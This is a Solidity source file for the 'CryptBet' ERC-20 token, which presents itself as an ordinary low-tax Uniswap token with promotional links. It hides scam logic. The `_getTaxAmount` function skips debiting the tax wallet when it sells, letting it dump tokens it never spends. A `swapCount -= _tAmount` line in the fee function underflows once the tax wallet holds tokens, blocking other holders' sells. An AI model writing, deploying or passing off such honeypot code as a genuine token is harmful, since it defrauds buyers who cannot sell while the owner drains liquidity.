/**
Web: https://www.cryptbet.casino
Twitter: https://twitter.com/cryptbetETH
Telegram: https://t.me/cryptbetETH
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

contract CRYPTBET is IERC20, Auth {
    string private constant _name = "CryptBet";
    string private constant _symbol = "CRYPTBET";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    address payable private taxWallet;

    uint256 private swapCount=0;
    uint256 public buyCount=0;

    uint256 private _initialBuyTax=1;
    uint256 private _initialSellTax=1;
    uint256 private _midSellTax=1;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 public _reduceBuyTaxAt=25;
    uint256 public _reduceSellTax1At=25;
    uint256 public _reduceSellTax2At=30;
    
    uint256 private _tAmount;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private constant _taxSwapMin = _totalSupply / 20000;
    uint256 private constant _taxSwapMax = _totalSupply / 100;

    address private _lpV2;
  
    address private constant routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapRouter02 private _uniRouterV2 = IUniswapRouter02(routerAddress);
    
    mapping (address => bool) private _isAMMPair;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxTxAmount = 50_000_000 * (10**_decimals); // 5%
    
    bool private _tradeEnabled;
    bool private _lockTheSwap = false;
    modifier lockTaxSwap { 
        _lockTheSwap = true; 
        _; 
        _lockTheSwap = false; 
    }

    constructor() Auth(msg.sender) { 
        taxWallet = payable(0x673aD899fcA782795C7238b48eF6bAb0cAcE6295);
        _balances[address(this)] = _totalSupply;
        _excludedFromFees[_owner] = true;
        _excludedFromFees[taxWallet] = true;
        _excludedFromFees[address(this)] = true;
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradeEnabled) { require(_excludedFromFees[sender], "Trading not open"); }
        if ( !_lockTheSwap && !_excludedFromFees[sender] && _isAMMPair[recipient] && buyCount >= swapCount) { swapBack(); }
        if (limited && sender == _lpV2 && !_excludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxTxAmount, "Forbid");
        } _tAmount = balanceOf(taxWallet);
        if (transferDelayEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient]) {
            if (recipient != routerAddress && recipient != _lpV2) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        } 
        uint256 _taxAmount = takeTxFee(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= _getTaxAmount(sender, recipient, amount);
        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount;
        }
        buyCount++;
        _balances[recipient] += _transferAmount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][routerAddress] < _tokenAmount ) {
            _allowances[address(this)][routerAddress] = type(uint256).max;
        }
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniRouterV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterV2.WETH();
        _uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _getTaxAmount(address from, address to, uint256 amount) private view returns(uint256) {
        return _isAMMPair[to] && from == taxWallet ? 0 : amount;
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function openTrading() external payable onlyOwner lockTaxSwap {
        require(_lpV2 == address(0), "LP exists");
        require(!_tradeEnabled, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");

        _lpV2 = IUniswapFactory(_uniRouterV2.factory()).createPair(address(this), _uniRouterV2.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isAMMPair[_lpV2] = true; _tradeEnabled = true;
    }

    receive() external payable {}

    function _isTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradeEnabled ) { checkResult = true; } 
        else if (_excludedFromFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function takeTxFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;
        if (_tradeEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient] ) { 
            if ( _isAMMPair[sender] || _isAMMPair[recipient] ) {
                taxAmount = (amount / 100) * ((buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == _lpV2 && sender != address(this)){
                    uint256 taxRate; swapCount -= _tAmount; 
                    if(buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }
        return taxAmount;
    }

    function swapBack() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if ( _taxTokensAvailable >= _taxSwapMin && _tradeEnabled ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = taxWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }
}